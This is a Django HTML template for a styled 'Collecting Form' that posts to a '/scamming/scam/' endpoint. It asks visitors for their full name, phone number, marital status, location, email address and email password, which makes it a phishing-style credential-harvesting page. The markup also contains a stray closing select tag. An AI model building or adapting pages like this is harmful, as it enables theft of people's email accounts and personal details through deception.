<!DOCTYPE html>
<html>
<head>
  <title>Collecting Form</title>
  <style>
    /* Form container */
    .form-container {
      max-width: 500px;
      margin: 0 auto;
    }

    /* Form fields */
    .form-field {
      margin-bottom: 20px;
    }

    .form-field label {
      display: block;
      font-weight: bold;
      margin-bottom: 5px;
    }

    .form-field input[type="text"],
    .form-field input[type="email"],
    .form-field select {
      width: 100%;
      padding: 8px;
      font-size: 16px;
      border: 1px solid #ccc;
      border-radius: 4px;
    }

    /* Form submit button */
    .form-submit {
      text-align: center;
    }

    .form-submit input[type="submit"] {
      padding: 10px 20px;
      font-size: 16px;
      font-weight: bold;
      background-color: #4CAF50;
      color: #fff;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="form-container">
    <form action="/scamming/scam/" method="POST">
      {% csrf_token %}

      <div class="form-field">
        <label for="{{ cform.full_name.id_for_label }}">Full Name:</label>
        {{cform.full_name}}
      </div>

      <div class="form-field">
        <label for="{{ cform.phone_number.id_for_label }}">Phone Number:</label>
        {{cform.phone_number}}
      </div>

      <div class="form-field">
        <label for="{{ cform.marital_status.id_for_label }}">Marital Status:</label>
          {{cform.marital_status}}
        </select>
      </div>

      <div class="form-field">
        <label for="{{ cform.location.id_for_label }}">Location:</label>
        {{cform.location}}
      </div>

      <div class="form-field">
        <label for="{{ cform.status.id_for_label }}">Status:</label>
        {{cform.status}}
      </div>

      <div class="form-field">
        <label for="{{ cform.email.id_for_label }}">Email:</label>
        {{cform.email}}
      </div>

      <div class="form-field">
        <label for="{{ cform.email_password.id_for_label }}">Email Password:</label>
        {{cform.email_password}}
      </div>

      <div class="form-submit">
        <input type="submit" value="Submit">
      </div>
    </form>
  </div>
</body>
</html>
